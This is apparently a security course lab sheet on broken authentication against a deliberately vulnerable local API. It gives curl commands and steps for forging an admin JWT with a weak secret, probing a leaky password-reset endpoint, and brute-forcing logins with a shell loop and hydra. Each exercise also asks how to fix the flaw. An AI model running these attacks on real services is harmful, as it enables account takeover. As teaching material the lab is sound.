# Week 04: Broken Authentication

## Learning Objectives
- Identify authentication flaws in web applications
- Exploit weak JWT secrets and token handling
- Perform brute force and credential stuffing attacks
- Implement secure authentication mechanisms

## Exercises

### Exercise 1: JWT Weak Secret
The vulnerable API uses a hardcoded JWT secret.

```bash
# Login as alice and capture the token
TOKEN=$(curl -s -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password"}' | jq -r '.token')

# Decode the JWT (base64 decode the payload)
echo $TOKEN | cut -d. -f2 | base64 -d

# Try to crack the JWT secret using hashcat or John
# Use jwt_tool to scan for vulnerabilities
python3 jwt_tool.py $TOKEN

# Modify the token to change role to admin
# Use jwttool or manually craft:
# 1. Change role from "user" to "admin"
# 2. Sign with the weak secret "super-secret-jwt"
```

**Questions:**
- What algorithm is used for JWT signing?
- What is the JWT secret?
- Can you forge a token with role=admin?

### Exercise 2: Password Reset Token Leakage
The password reset endpoint reveals the reset token:

```bash
# Request password reset
curl -X POST http://localhost:8080/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sec-lab.local"}'
```

**Questions:**
- What information is leaked in the response?
- How would you exploit this?
- What is the proper way to implement password reset?

### Exercise 3: No Password Strength Enforcement
Try registering with weak passwords:

```bash
# Register with weak password
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@x.com","password":"123"}'

curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker2","email":"h2@x.com","password":"a"}'
```

**Questions:**
- What password complexity requirements are enforced?
- What should the minimum password requirements be?

### Exercise 4: No Rate Limiting / Brute Force
Attempt to brute force the login:

```bash
# Try multiple passwords rapidly
for pw in password 123456 admin admin123 test letmein; do
  curl -s -X POST http://localhost:8080/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pw\"}" && echo ""
done

# Using hydra for more sophisticated brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost -s 8080 -f http-post-form \
  "/auth/login:{\"username\":\"admin\",\"password\":\"^PASS^\"}:Invalid credentials"
```

**Questions:**
- How many requests can you send per second?
- Is there any account lockout mechanism?
- How would you implement rate limiting?

### Exercise 5: Token Storage Analysis
Check how tokens are handled by the API:

```bash
# Check if token is returned in URL or response body
curl -v -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password"}'
```

**Questions:**
- How is the token transmitted?
- Are there any tokens in URL parameters?
- What storage mechanism would you recommend?

## Deliverable
- Forge a JWT with admin privileges
- Demonstrate a brute force attack
- Document authentication vulnerabilities found
- Propose authentication hardening measures
